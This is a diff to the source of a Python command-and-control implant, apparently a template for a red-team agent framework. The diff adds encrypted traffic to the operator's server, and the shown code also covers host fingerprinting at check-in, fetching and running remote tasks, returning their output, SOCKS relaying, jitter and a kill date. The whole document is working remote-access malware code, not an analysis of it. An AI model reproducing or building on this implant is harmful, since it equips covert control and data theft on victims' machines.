@@ -5,20 +5,75 @@ import threading, queue
 
 CHUNK_SIZE = 51200
 
+
 class Mxdl:
     def encrypt(self, data):
-        return data
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.primitives import hashes, hmac, padding
+        from cryptography.hazmat.backends import default_backend
+
+        if not self.agent_config["enc_key"]["value"] == "none" and len(data) > 0:
+            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
+            iv = os.urandom(16)
+
+            backend = default_backend()
+            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
+            encryptor = cipher.encryptor()
+
+            padder = padding.PKCS7(128).padder()
+            padded_data = padder.update(data)
+            padded_data += padder.finalize()
+
+            ct = encryptor.update(padded_data) + encryptor.finalize()
+
+            h = hmac.HMAC(key, hashes.SHA256(), backend)
+            h.update(iv + ct)
+            hmac = h.finalize()
+
+            output = iv + ct + hmac
+            return output
+        else:
+            return data
 
     def decrypt(self, data):
-        return data.decode()
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.primitives import hashes, hmac, padding
+        from cryptography.hazmat.backends import default_backend
 
+        if not self.agent_config["enc_key"]["value"] == "none":
+            if len(data) > 0:
+                backend = default_backend()
+
+                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
+                uuid = data[:36]
+                iv = data[36:52]
+                ct = data[52:-32]
+                received_hmac = data[-32:]
+
+                h = hmac.HMAC(key, hashes.SHA256(), backend)
+                h.update(iv + ct)
+                hmac = h.finalize()
+
+                if base64.b64encode(hmac) == base64.b64encode(received_hmac):
+                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
+                    decryptor = cipher.decryptor()
+                    pt = decryptor.update(ct) + decryptor.finalize()
+                    unpadder = padding.PKCS7(128).unpadder()
+                    decrypted_data = unpadder.update(pt)
+                    decrypted_data += unpadder.finalize()
+                    return (uuid + decrypted_data).decode()
+                else:
+                    return ""
+            else:
+                return ""
+        else:
+            return data.decode()
 
     def getOSVersion(self):
         if platform.mac_ver()[0]:
             return "macOS " + platform.mac_ver()[0]
         else:
             return platform.system() + " " + platform.release()
-
 
     def getUsername(self):
         try:
@@ -28,31 +83,26 @@ class Mxdl:
         for k in ["USER", "LOGNAME", "USERNAME"]:
             if k in os.environ.keys(): return os.environ[k]
 
-
     def formatMessage(self, data, urlsafe=False):
         output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
         if urlsafe:
-            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+            output = base64.urlsafe_b64encode(
+                self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
         return output
-
 
     def formatResponse(self, data):
         return json.loads(data.replace(self.agent_config["UUID"], ""))
 
-
     def postMessageAndRetrieveResponse(self, data):
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data), 'POST')))
 
-
     def getMessageAndRetrieveResponse(self, data):
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
-
 
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{"task_id": task_id, "user_output": output, "completed": False}]
         message = {"action": "post_response", "responses": responses}
         response_data = self.postMessageAndRetrieveResponse(message)
-
 
     def postResponses(self):
         try:
@@ -79,7 +129,6 @@ class Mxdl:
         except:
             pass
 
-
     def processTask(self, task):
         try:
             task["started"] = True
@@ -104,7 +153,6 @@ class Mxdl:
             task["completed"] = True
             task["result"] = error
 
-
     def processTaskings(self):
         threads = list()
         taskings = self.taskings
@@ -114,7 +162,6 @@ class Mxdl:
                                      args=(task,))
                 threads.append(x)
                 x.start()
-
 
     def getTaskings(self):
         data = {"action": "get_tasking", "tasking_size": -1}
@@ -133,7 +180,6 @@ class Mxdl:
             self.taskings.append(t)
         if "socks" in tasking_data:
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
-
 
     def checkIn(self):
         hostname = socket.gethostname()
@@ -157,7 +203,8 @@ class Mxdl:
             "encryption_key": self.agent_config["enc_key"]["enc_key"],
             "decryption_key": self.agent_config["enc_key"]["dec_key"]
         }
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
+        encoded_data = base64.b64encode(
+            self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
         decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
 
         if "status" in decoded_data:
@@ -166,7 +213,6 @@ class Mxdl:
             return True
         else:
             return False
-
 
     def makeRequest(self, data, method='GET'):
         hdrs = {}
@@ -178,7 +224,8 @@ class Mxdl:
                 self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
         else:
             req = urllib.request.Request(
-                self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
+                self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data,
+                hdrs)
         #CERTSKIP
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
@@ -207,7 +254,6 @@ class Mxdl:
         except:
             return ""
 
-
     def passedKilldate(self):
         kd_list = [int(x) for x in self.agent_config["KillDate"].split("-")]
         kd = datetime(kd_list[0], kd_list[1], kd_list[2])
@@ -215,7 +261,6 @@ class Mxdl:
             return True
         else:
             return False
-
 
     def agentSleep(self):
         j = 0
@@ -225,8 +270,7 @@ class Mxdl:
                 j = random.randrange(0, int(v))
         time.sleep(self.agent_config["Sleep"] + j)
 
-
-#COMMANDS_HERE
+    #COMMANDS_HERE
 
     def __init__(self):
         self.socks_open = {}
@@ -271,6 +315,7 @@ class Mxdl:
                     except:
                         pass
                     self.agentSleep()
+
 
 if __name__ == "__main__":
     Mxdl = Mxdl()
